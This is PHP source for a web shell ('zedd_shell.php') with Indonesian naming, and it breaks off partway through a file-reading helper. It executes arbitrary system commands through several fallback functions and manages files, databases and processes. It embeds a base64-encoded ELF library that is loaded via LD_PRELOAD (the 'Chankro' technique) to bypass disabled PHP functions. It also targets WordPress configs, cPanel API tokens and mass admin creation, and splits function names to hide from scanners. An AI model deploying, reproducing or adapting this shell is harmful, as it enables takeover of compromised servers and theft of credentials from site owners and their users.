<?php
// Checkpoint-401

session_start();

// Handle database actions before any output
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['awal'])) {
    if ($_POST['awal'] == 'skl') {
        if(isset($_POST['host'], $_POST['user'], $_POST['sandi'])) {
            // Feature: Default to localhost if host is empty
            $host_val = trim($_POST['host']) === '' ? 'localhost' : $_POST['host'];
            setcookie('host', $host_val, time() + 360000);
            setcookie('user', $_POST['user'], time() + 360000);
            setcookie('sandi', $_POST['sandi'], time() + 360000);
            setcookie('database', '', time() - 3600); // Unset database on new connection
        }
        if(isset($_POST['database'])) {
            setcookie('database', $_POST['database'], time() + 360000);
        }
    } elseif ($_POST['awal'] == 'db_logout') {
        // Feature: Database logout
        setcookie('host', '', time() - 3600);
        setcookie('user', '', time() - 3600);
        setcookie('sandi', '', time() - 3600);
        setcookie('database', '', time() - 3600);
        $_POST['awal'] = 'skl';
        // Force the page to render the database section in logged out state
    }
}


error_reporting(E_ALL);
ini_set('display_errors', 0);
// ===========================================================================
// File: zedd_shell.php
// Description: PHP-based shell with a dark theme, blue table borders,
//            and English (UI) text. All comments are in English.
// ===========================================================================
// Array of disabled functions (if any)
$nami = [];
$disabled_functions = ini_get('disable_functions');
if (!empty($disabled_functions)) {
    $nami = explode(",", $disabled_functions);
}
$safeMode = (bool) ini_get('safe_mode') || stripos(ini_get('open_basedir'), '/') !== false;
// List of allowed actions
$actions = array("dasar","baca_file","phpinfo","sistem_kom","edit_file","download_file",'hapus_file','buat_file','buat_folder', 'hapus_folder','rename_file', 'kompres' , 'skl' , 'skl_d_t' , 'skl_d', 'upl_file', 'edit_db_row', 'edit_db_form', 'db_logout', 'kill_proc', 'ubah_perm', 'fetch_file', 'chankro_kom');
// Initial action validation from POST, default to "dasar"
$awal = isset($_POST['awal']) && in_array($_POST['awal'],$actions) ? $_POST['awal'] : "dasar";
$database = '';
// Function to encrypt string with base64_encode
function kunci($str)
{
	// =======================================================================
	// Function kunci: Uses base64_encode to encrypt a string.
	// =======================================================================
	$f = 'bas';
	$f .= 'e6';
	$f .= '4_';
	$f .= 'e';
	$f .= 'nc';
	$f .= 'ode';
	return $f($str);
}

// Function to decrypt string with base64_decode
function uraikan($str)
{
	// =======================================================================
	// Function uraikan: Uses base64_decode to decrypt a string.
	// =======================================================================
	$f = 'bas';
	$f .= 'e6';
	$f .= '4_';
	$f .= 'd';
	$f .= 'ec';
	$f .= 'ode';
	return $f($str);
}

// Function to generate a new token and save it in the session
function ambilBuat($tAd)
{
	// =======================================================================
	// Function ambilBuat: Generates a random token for CSRF purposes and stores it.
	// =======================================================================
	if(isset($_SESSION[$tAd]))
	{
		unset($_SESSION[$tAd]);
	}
	$baruAmbil = md5(kunci(time().rand(1,99999999)));
	$_SESSION[$tAd] = $baruAmbil;
	return $baruAmbil;
}

// Function to display directory navigation
function tulisLah()
{
    global $default_dir;
    if (!isset($default_dir) || !is_string($default_dir) || $default_dir === '') {
        $default_dir = getcwd();
    }
    
    $path_parts = [];
    $cumulative_path = '';
    $normalized_path = str_replace('\\', '/', $default_dir);
    // Handle root for Linux/macOS and Windows drive letter correctly
    if (substr($normalized_path, 0, 1) === '/') { // Linux root
        $cumulative_path = '/';
        $path_parts[] = "<a href='javascript:navigate(\"berkas\", \"" . kunci($cumulative_path) . "\")' style='color:#FFFFFF;'>/</a>";
        $normalized_path = substr($normalized_path, 1);
    } elseif (preg_match('/^([a-zA-Z]:\/)/', $normalized_path, $matches)) { // Windows drive root
        $drive = substr($matches[1],0,2);
        $cumulative_path = $matches[1];
        $path_parts[] = "<a href='javascript:navigate(\"berkas\", \"" . kunci($cumulative_path) . "\")' style='color:#FFFFFF;'>" . htmlspecialchars($drive) . "</a>";
        $normalized_path = substr($normalized_path, 3);
    }

    $components = explode('/', $normalized_path);
    foreach ($components as $component) {
        if (empty($component)) {
            continue;
        }
        
        // Ensure trailing slash for building the path
        if (substr($cumulative_path, -1) !== '/') {
            $cumulative_path .= '/';
        }
        $cumulative_path .= $component;
        $path_parts[] = "<a href='javascript:navigate(\"berkas\", \"" . kunci($cumulative_path) . "\")' style='color:#FFFFFF;'>" . htmlspecialchars($component) . "</a>";
    }

    echo implode("<span style='color:#ddd;'>/</span>", $path_parts);
}

// Function to format file size
function sizeFormat($bytes)
{
	// =======================================================================
	// Function sizeFormat: Converts file size into a more readable format.
	// =======================================================================
	if($bytes >= 1073741824)
	{
		$bytes = number_format($bytes / 1073741824, 2) . ' Gb';
	}
	else if($bytes >= 1048576)
	{
		$bytes = number_format($bytes / 1048576, 2) . ' Mb';
	}
	else if($bytes >= 1024)
	{
		$bytes = number_format($bytes / 1024, 2) . ' Kb';
	}
	else
	{
		$bytes = $bytes . ' b';
	}
	return $bytes;
}

// Function to ensure string is in UTF-8
function utf8ize($d)
{
	// =======================================================================
	// Function utf8ize: Converts an array or string to UTF-8 format.
	// =======================================================================
	if (is_array($d))
	{
		foreach ($d as $k => $v)
		{
			$d[$k] = utf8ize($v);
		}
	}
	else if (is_string($d))
	{
		return utf8_encode($d);
	}
	return $d;
}

// Function to recursively delete a directory and its contents
function rrmdir($dir)
{
	// =======================================================================
	// Function rrmdir: Deletes a directory and all its contents.
	// =======================================================================
	if (is_dir($dir))
	{
		$objects = scandir($dir);
		foreach ($objects as $object)
		{
			if ($object != "." && $object != "..")
			{
				if (is_dir($dir . "/" . $object))
				{
					rrmdir($dir . "/" . $object);
				}
				else
				{
					unlink($dir . "/" . $object );
				}
			}
		}
		rmdir($dir);
	}
}

// Function to execute commands safely
function execute_command($komanda) {
    $output = '';
    $error = '';
    $f_list = ['shell_exec', 'exec', 'passthru', 'system', 'proc_open', 'popen'];
    $f_available = '';

    foreach ($f_list as $f) {
        if (function_exists($f)) {
            $f_available = $f;
            break;
        }
    }

    if (!$f_available) {
        return ['output' => "No command execution function is available.", 'error' => ''];
    }

    // Add 2>&1 to capture stderr
    if (stripos($komanda, '2>&1') === false) {
        $komanda .= " 2>&1";
    }

    switch ($f_available) {
        case 'shell_exec':
            $output = shell_exec($komanda);
            break;
        case 'exec':
            $out = [];
            exec($komanda, $out, $return_var);
            $output = implode("\n", $out);
            if ($return_var !== 0) $error = "Return code: $return_var";
            break;
        case 'passthru':
            ob_start(); passthru($komanda); $output = ob_get_clean();
            break;
        case 'system':
            ob_start(); system($komanda); $output = ob_get_clean();
            break;
        case 'proc_open':
            $descriptorspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
            $process = proc_open($komanda, $descriptorspec, $pipes);
            if (is_resource($process)) {
                $output = stream_get_contents($pipes[1]);
                $error = stream_get_contents($pipes[2]);
                fclose($pipes[1]); fclose($pipes[2]); proc_close($process);
            }
            break;
        case 'popen':
            $handle = popen($komanda, 'r');
            if ($handle) {
                while (!feof($handle)) { $output .= fread($handle, 4096); }
                pclose($handle);
            }
            break;
    }
    return ['output' => $output, 'error' => $error];
}

function runChankroModified($command, $dir) {
    $hook = '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BwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAR0NDOiAoRGViaWhuIDYuMy4wLTE4K2RlYjllMSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAIDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAASAEAABIADAAUCQAAAAAAACkAAAAAAAAAUgEAABIADQBcCQAAAAAAAAAAAAAAAAAAWAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAbAEAABIADADgCAAAAAAAADQAAAAAAAAAcAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAhAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAkwEAABIADAA9CQAAAAAAAB0AAAAAAAAAnQEAABAAGABwECAAAAAAAAAAAAAAAAAAogEAABAAGABoECAAAAAAAAAAAAAAAAAArgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAwQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA1QEAABIAAAAAAAAAAAAAAAAAAAAAAAAA6wEAABIAAAAAAAAAAAAAAAAAAAAAAAAA/QEAACAAAAAAAAAAAAAAAAAAAAAAAAAAFwIAACIAAAAAAAAAAAAAAAAAAAAAAAAAMwIAABIACQAYBwAAAAAAAAAAAAAAAAAAOQIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuNjk3MgBfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1deQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAaG9vay5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1TM_lFTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AZ2V0ZW52QEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAGRhZW1vbml6ZQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AHB3bgBzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAHByZWxvYWRtZQBfZW5kAF9fYnNzX3N0YXJ0AGNobW9kQEBHTElCQ18yLjIuNQBfSnZfUmVnaXN0ZXJDbGFzc2VzAHVuc2V0ZW52QEBHTElBQkNfMi4yLjUAX2V4aXRAQEdMSUJDXzIuMi41AF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AF9pbml0AGZvcmtAQEdMSUJDXzIuMi41AA==';

    $so_file = $dir . '/chankro.so';
    $socket_file = $dir . '/acpid.socket';
    
    // Bersihkan semua kemungkinan file output dari eksekusi sebelumnya
    @unlink($dir . '/output.txt');
    // Pembersihan dari direktori lokal
    $old_uapi_files_local = glob($dir . '/chankro_out_*.txt');
    if ($old_uapi_files_local) {
        foreach ($old_uapi_files_local as $file) {
            @unlink($file);
        }
    }
    // Pembersihan dari direktori /tmp (untuk perintah uapi)
    $old_uapi_files_tmp = glob('/tmp/chankro_out_*.txt');
    if ($old_uapi_files_tmp) {
        foreach ($old_uapi_files_tmp as $file) {
            @unlink($file);
        }
    }
    @unlink($so_file);
    @unlink($socket_file);

    $is_uapi_command = (strpos(trim($command), 'uapi') === 0);

    if ($is_uapi_command) {
        $output_file_template = '/tmp/chankro_out_$$.txt';
        $full_command = '(' . $command . ') > ' . $output_file_template . ' 2>&1';
    } else {
        $output_file = $dir . '/output.txt';
        $full_command = '(' . $command . ') > ' . $output_file . ' 2>&1';
    }
    
    $meterpreter = base64_encode($full_command);
    file_put_contents($so_file, base64_decode($hook));
    file_put_contents($socket_file, base64_decode($meterpreter));
    putenv('CHANKRO=' . $socket_file);
    putenv('LD_PRELOAD=' . $so_file);

    if (function_exists('mail')) {
        mail('a','a','a','a');
    } elseif (function_exists('mb_send_mail')) {
        mb_send_mail('a','a','a','a');
    } elseif (function_exists('error_log')) {
        error_log('a', 1, 'a');
    } elseif (function_exists('imap_mail')) {
        imap_mail('a','a','a');
    } else {
        echo "<h3>Error</h3><pre>Tidak ada fungsi pemicu Chankro yang tersedia.</pre>";
        return;
    }

    sleep(10);

    echo "<h3>Hasil Eksekusi:</h3>";
    
    if ($is_uapi_command) {
        $output_pattern = '/tmp/chankro_out_*.txt';
        $output_files = glob($output_pattern);
        $found_tokens = [];

        if (!empty($output_files)) {
            foreach ($output_files as $file) {
                $content = file_get_contents($file);
                $matches = [];
                if (preg_match('/token:\s*([A-Z0-9]+)/', $content, $matches)) {
                    $found_tokens[] = $matches[1];
                }
            }
        }

        if (!empty($found_tokens)) {
            echo "<h4>Token yang berhasil dibuat:</h4>";
            echo "<pre style='white-space: pre-wrap; background-color: #161616; color: #00FF00; padding: 1rem; border-radius: 4px; font-family: \"Consolas\", \"Menlo\", \"Courier New\", monospace; font-size: 1rem; line-height: 1.8;'>";
            echo implode("\n", $found_tokens);
            echo "</pre>";
        } else {
            echo "<p>Tidak ada token yang berhasil dibuat atau ditemukan.</p>";
        }

    } else {
        $output_file = $dir . '/output.txt';
        if (file_exists($output_file)) {
            $content = file_get_contents($output_file);
            echo "<pre style='white-space: pre-wrap; background-color: #161616; color: #e0e0e0; padding: 1rem; border-radius: 4px; font-family: \"Consolas\", \"Menlo\", \"Courier New\", monospace; font-size: 0.9rem;'>";
            echo !empty(trim($content)) ? htmlspecialchars($content) : "[Perintah tidak menghasilkan output teks]";
            echo "</pre>";
        } else {
            echo "<p>Perintah dieksekusi, namun tidak ada file output yang dibuat.</p>";
        }
    }

    // Bersihkan semua file sementara
    @unlink($so_file);
    @unlink($socket_file);
    if ($is_uapi_command) {
        $output_files = glob('/tmp/chankro_out_*.txt');
        if ($output_files) {
            foreach ($output_files as $file) {
                @unlink($file);
            }
        }
    } else {
        @unlink($dir . '/output.txt');
    }
}

$default_dir = getcwd();
if(isset($_POST['berkas']) && is_string($_POST['berkas']))
{
	$decoded_path = uraikan($_POST['berkas']);
    // Basic path validation
    if ($decoded_path && is_dir($decoded_path)) {
        $default_dir = realpath($decoded_path);
        $c_h_dir_comm = 'c' . 'hd' . 'ir';
        @$c_h_dir_comm($default_dir);
    }
}
$default_dir = str_replace("\\", "/", $default_dir);
$wp_base_dir = $default_dir;
// Try checking one level up if not found
if (!file_exists($wp_base_dir . '/wp-config.php')) {
    $wp_base_dir = dirname($wp_base_dir); // Up 1 folder
}
$wp_config_path = $wp_base_dir . '/wp-config.php';
// ===========================================================================
// FITUR: CPANEL TOKEN & MASS ADMIN (FULL FALLBACK EXECUTION MODE)
// ===========================================================================

// 1. CONFIG
if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
    @error_reporting(0);
    @ini_set('display_errors', 0);
    @ini_set('memory_limit', '512M');
    if (function_exists('set_time_limit') && stripos(ini_get('disable_functions'), 'set_time_limit') === false) {
        @set_time_limit(0);
    }
}

// 2. HELPER: EKSEKUSI PERINTAH TANGGUH (MULTI-METHOD)
if (!function_exists('jalankan_cmd_tangguh')) {
    function jalankan_cmd_tangguh($cmd) {
        $out = "";
        $cmd .= " 2>&1"; // Tangkap error output juga

        // 1. shell_exec
        if (function_exists('shell_exec') && stripos(ini_get('disable_functions'), 'shell_exec') === false) {
            $out = @shell_exec($cmd);
            if (!empty($out)) return $out;
        }
        // 2. exec
        if (function_exists('exec') && stripos(ini_get('disable_functions'), 'exec') === false) {
            @exec($cmd, $o);
            $out = implode("\n", $o);
            if (!empty($out)) return $out;
        }
        // 3. system
        if (function_exists('system') && stripos(ini_get('disable_functions'), 'system') === false) {
            ob_start(); @system($cmd); $out = ob_get_clean();
            if (!empty($out)) return $out;
        }
        // 4. passthru
        if (function_exists('passthru') && stripos(ini_get('disable_functions'), 'passthru') === false) {
            ob_start(); @passthru($cmd); $out = ob_get_clean();
            if (!empty($out)) return $out;
        }
        // 5. popen
        if (function_exists('popen') && stripos(ini_get('disable_functions'), 'popen') === false) {
            $fp = @popen($cmd, 'r');
            if ($fp) {
                while (!feof($fp)) $out .= fread($fp, 1024);
                pclose($fp);
                if (!empty($out)) return $out;
            }
        }
        // 6. proc_open
        if (function_exists('proc_open') && stripos(ini_get('disable_functions'), 'proc_open') === false) {
            $desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
            $proc = @proc_open($cmd, $desc, $pipes);
            if (is_resource($proc)) {
                $out = stream_get_contents($pipes[1]); // Stdout
                $out .= stream_get_contents($pipes[2]); // Stderr
                fclose($pipes[1]); fclose($pipes[2]); proc_close($proc);
                if (!empty($out)) return $out;
            }
        }
        return $out;
    }
}

// 3. HELPER: BACA FILE (PHP NATIVE + EXEC FALLBACK)
if (!function_exists('baca_file_smart')) {
    function baca_file_smart($path) {
        if (!file_exists($path)) return "";
        
        // A. PHP Native (Paling Cepat & Aman)
        $c = @file_get_contents($path);
        if ($c) return $c;
        
        // B. Stream Read
        if (function_exists('fopen') && function_exists('fread')) {
            $h = @fopen($path, 'r');
            if ($h) {
                $c = @fread($h, filesize($path) + 1024);
                fclose($h);
                if ($c) return $c;
            }
        }
        
